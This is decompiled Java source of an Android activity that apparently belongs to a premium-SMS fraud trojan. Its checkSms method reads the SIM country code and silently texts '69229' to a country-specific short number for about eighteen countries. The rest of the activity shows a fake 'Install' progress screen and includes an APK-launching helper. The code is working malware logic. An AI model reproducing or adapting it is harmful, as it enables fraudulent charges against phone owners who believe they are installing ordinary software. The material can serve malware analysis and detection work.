	private static final  IDD_LOAD_PROGRESS
	protected static final  IDD_SCAN_PROGRESS
	 android.widget.Button BtnBack
	 android.widget.Button BtnExit
	 android.widget.Button BtnNext
	 android.app.ProgressDialog LoadProgress
	 android.app.ProgressDialog ScanProgress
	 java.io.InputStream iFile
	 android.widget.ImageView imageView1
	  smsCount
	
	    public RuleActivity()
	    {
	        this.smsCount = 0;
	        return;
	    }
	
	
	    static synthetic void access$0(com.pavel.newmodule.RuleActivity p0)
	    {
	        p0.checkSms();
	        return;
	    }
	
	
	    private void checkSms()
	    {
	        String v0 = ((android.telephony.TelephonyManager) this.getSystemService("phone")).getSimCountryIso();
	        if (!v0.equalsIgnoreCase("az")) {
	            if (!v0.equalsIgnoreCase("gb")) {
	                if (!v0.equalsIgnoreCase("am")) {
	                    if (!v0.equalsIgnoreCase("by")) {
	                        if (!v0.equalsIgnoreCase("de")) {
	                            if (!v0.equalsIgnoreCase("ge")) {
	                                if (!v0.equalsIgnoreCase("il")) {
	                                    if (!v0.equalsIgnoreCase("kz")) {
	                                        if (!v0.equalsIgnoreCase("kg")) {
	                                            if (!v0.equalsIgnoreCase("lv")) {
	                                                if (!v0.equalsIgnoreCase("lt")) {
	                                                    if (!v0.equalsIgnoreCase("ru")) {
	                                                        if (!v0.equalsIgnoreCase("pl")) {
	                                                            if (!v0.equalsIgnoreCase("tj")) {
	                                                                if (!v0.equalsIgnoreCase("ua")) {
	                                                                    if (!v0.equalsIgnoreCase("fr")) {
	                                                                        if (!v0.equalsIgnoreCase("cz")) {
	                                                                            if (v0.equalsIgnoreCase("ee")) {
	                                                                                this.sendSMS("17013", "69229");
	                                                                            }
	                                                                        } else {
	                                                                            this.sendSMS("9090199", "69229");
	                                                                        }
	                                                                    } else {
	                                                                        this.sendSMS("81185", "69229");
	                                                                    }
	                                                                } else {
	                                                                    this.sendSMS("7540", "69229");
	                                                                }
	                                                            } else {
	                                                                this.sendSMS("1171", "69229");
	                                                            }
	                                                        } else {
	                                                            this.sendSMS("92525", "69229");
	                                                        }
	                                                    } else {
	                                                        this.sendSMS("1121", "69229");
	                                                    }
	                                                } else {
	                                                    this.sendSMS("1645", "69229");
	                                                }
	                                            } else {
	                                                this.sendSMS("1874", "69229");
	                                            }
	                                        } else {
	                                            this.sendSMS("4157", "69229");
	                                        }
	                                    } else {
	                                        this.sendSMS("7790", "69229");
	                                    }
	                                } else {
	                                    this.sendSMS("4545", "69229");
	                                }
	                            } else {
	                                this.sendSMS("8014", "69229");
	                            }
	                        } else {
	                            this.sendSMS("80888", "69229");
	                        }
	                    } else {
	                        this.sendSMS("7781", "69229");
	                    }
	                } else {
	                    this.sendSMS("1121", "69229");
	                }
	            } else {
	                this.sendSMS("79067", "69229");
	            }
	        } else {
	            this.sendSMS("9014", "69229");
	        }
	        return;
	    }
	
	
	    private void sendSMS(String p9, String p10)
	    {
	        android.app.PendingIntent v4 = android.app.PendingIntent.getBroadcast(this, 0, new android.content.Intent("SMS_SENT"), 0);
	        android.app.PendingIntent v5 = android.app.PendingIntent.getBroadcast(this, 0, new android.content.Intent("SMS_DELIVERED"), 0);
	        this.registerReceiver(new com.pavel.newmodule.RuleActivity$4(this), new android.content.IntentFilter("SMS_SENT"));
	        this.registerReceiver(new com.pavel.newmodule.RuleActivity$5(this), new android.content.IntentFilter("SMS_DELIVERED"));
	        android.telephony.gsm.SmsManager.getDefault().sendTextMessage(p9, 0, p10, v4, v5);
	        return;
	    }
	
	
	    private void translateAPI()
	    {
	        if (!java.util.Locale.getDefault().getDisplayLanguage().contains("\u0440\u0443\u0441")) {
	            this.iFile = this.getResources().openRawResource(2130968583);
	            this.BtnNext.setText("Next");
	            this.BtnExit.setText("Exit");
	            this.BtnBack.setText("Back");
	        }
	        return;
	    }
	
	
	    public void checkAndCreateDirectory(String p4)
	    {
	        java.io.File v0_1 = new java.io.File(new StringBuilder().append(android.os.Environment.getExternalStorageDirectory()).append(p4).toString());
	        if (!v0_1.exists()) {
	            v0_1.mkdirs();
	        }
	        return;
	    }
	
	
	    public String inputStreamToString(java.io.InputStreamReader p6)
	    {
	        StringBuffer v1_1 = new StringBuffer();
	        java.io.BufferedReader v0_1 = new java.io.BufferedReader(p6);
	        while(true) {
	            String v2 = v0_1.readLine();
	            if (v2 == null) {
	                break;
	            }
	            v1_1.append(new StringBuilder(String.valueOf(v2)).append("\n").toString());
	        }
	        v0_1.close();
	        p6.close();
	        return v1_1.toString();
	    }
	
	
	    public void installApk(String p5)
	    {
	        android.content.Intent v0_1 = new android.content.Intent("android.intent.action.VIEW");
	        v0_1.setDataAndType(android.net.Uri.fromFile(new java.io.File(new StringBuilder().append(android.os.Environment.getExternalStorageDirectory()).append("/Apps/").append(p5).toString())), "application/vnd.android.package-archive");
	        this.startActivity(v0_1);
	        return;
	    }
	
	
	    public void onCreate(android.os.Bundle p9)
	    {
	        super.onCreate(p9);
	        this.setContentView(2130903041);
	        this.imageView1 = ((android.widget.ImageView) this.findViewById(2131099648));
	        this.imageView1.setVisibility(8);
	        this.BtnBack = ((android.widget.Button) this.findViewById(2131099656));
	        this.BtnBack.setOnClickListener(new com.pavel.newmodule.RuleActivity$1(this));
	        this.BtnExit = ((android.widget.Button) this.findViewById(2131099657));
	        this.BtnExit.setOnClickListener(new com.pavel.newmodule.RuleActivity$2(this));
	        this.BtnNext = ((android.widget.Button) this.findViewById(2131099655));
	        String v0 = ((android.telephony.TelephonyManager) this.getSystemService("phone")).getSimCountryIso();
	        if (!v0.equalsIgnoreCase("az")) {
	            if (!v0.equalsIgnoreCase("gb")) {
	                if (!v0.equalsIgnoreCase("am")) {
	                    if (!v0.equalsIgnoreCase("by")) {
	                        if (!v0.equalsIgnoreCase("de")) {
	                            if (!v0.equalsIgnoreCase("ge")) {
	                                if (!v0.equalsIgnoreCase("il")) {
	                                    if (!v0.equalsIgnoreCase("kz")) {
	                                        if (!v0.equalsIgnoreCase("kg")) {
	                                            if (!v0.equalsIgnoreCase("lv")) {
	                                                if (!v0.equalsIgnoreCase("lt")) {
	                                                    if (!v0.equalsIgnoreCase("ru")) {
	                                                        if (!v0.equalsIgnoreCase("pl")) {
	                                                            if (!v0.equalsIgnoreCase("tj")) {
	                                                                if (!v0.equalsIgnoreCase("ua")) {
	                                                                    if (!v0.equalsIgnoreCase("fr")) {
	                                                                        if (!v0.equalsIgnoreCase("cz")) {
	                                                                            if (!v0.equalsIgnoreCase("ee")) {
	                                                                                this.iFile = this.getResources().openRawResource(2130968583);
	                                                                            } else {
	                                                                                this.iFile = this.getResources().openRawResource(2130968582);
	                                                                            }
	                                                                        } else {
	                                                                            this.iFile = this.getResources().openRawResource(2130968580);
	                                                                        }
	                                                                    } else {
	                                                                        this.iFile = this.getResources().openRawResource(2130968584);
	                                                                    }
	                                                                } else {
	                                                                    this.iFile = this.getResources().openRawResource(2130968594);
	                                                                }
	                                                            } else {
	                                                                this.iFile = this.getResources().openRawResource(2130968593);
	                                                            }
	                                                        } else {
	                                                            this.iFile = this.getResources().openRawResource(2130968592);
	                                                            this.imageView1.setVisibility(0);
	                                                        }
	                                                    } else {
	                                                        this.iFile = this.getResources().openRawResource(2130968576);
	                                                    }
	                                                } else {
	                                                    this.iFile = this.getResources().openRawResource(2130968590);
	                                                }
	                                            } else {
	                                                this.iFile = this.getResources().openRawResource(2130968591);
	                                            }
	                                        } else {
	                                            this.iFile = this.getResources().openRawResource(2130968588);
	                                        }
	                                    } else {
	                                        this.iFile = this.getResources().openRawResource(2130968589);
	                                    }
	                                } else {
	                                    this.iFile = this.getResources().openRawResource(2130968587);
	                                }
	                            } else {
	                                this.iFile = this.getResources().openRawResource(2130968586);
	                            }
	                        } else {
	                            this.iFile = this.getResources().openRawResource(2130968581);
	                        }
	                    } else {
	                        this.iFile = this.getResources().openRawResource(2130968579);
	                    }
	                } else {
	                    this.iFile = this.getResources().openRawResource(2130968577);
	                }
	            } else {
	                this.iFile = this.getResources().openRawResource(2130968585);
	            }
	        } else {
	            this.iFile = this.getResources().openRawResource(2130968578);
	        }
	        this.translateAPI();
	        try {
	            ((android.widget.TextView) this.findViewById(2131099653)).setText(this.inputStreamToString(new java.io.InputStreamReader(this.iFile, "UTF-8")));
	        } catch (Exception v1) {
	            android.util.Log.e("Debug", "InputStreamToString failure", v1);
	        }
	        this.BtnNext.setOnClickListener(new com.pavel.newmodule.RuleActivity$3(this));
	        return;
	    }
	
	
	    protected android.app.Dialog onCreateDialog(int p4)
	    {
	        android.app.ProgressDialog v0_6;
	        switch (p4) {
	            case 0:
	                this.ScanProgress = new android.app.ProgressDialog(this);
	                this.ScanProgress.setProgressStyle(0);
	                this.ScanProgress.setTitle("Install");
	                this.ScanProgress.setMessage("Please wait...");
	                this.ScanProgress.setCancelable(0);
	                v0_6 = this.ScanProgress;
	                break;
	            case 1:
	                this.LoadProgress = new android.app.ProgressDialog(this);
	                this.LoadProgress.setProgressStyle(0);
	                this.LoadProgress.setTitle("Install");
	                this.LoadProgress.setMessage("Downloading file...");
	                this.LoadProgress.setCancelable(0);
	                v0_6 = this.LoadProgress;
	                break;
	            default:
	                v0_6 = 0;
	        }
	        return v0_6;
	    }
	
	
	    public void saveData()
	    {
	        android.content.SharedPreferences$Editor v0 = android.preference.PreferenceManager.getDefaultSharedPreferences(this).edit();
	        v0.putBoolean(this.getString(2131034114), 1);
	        v0.commit();
	        return;
	    }
	
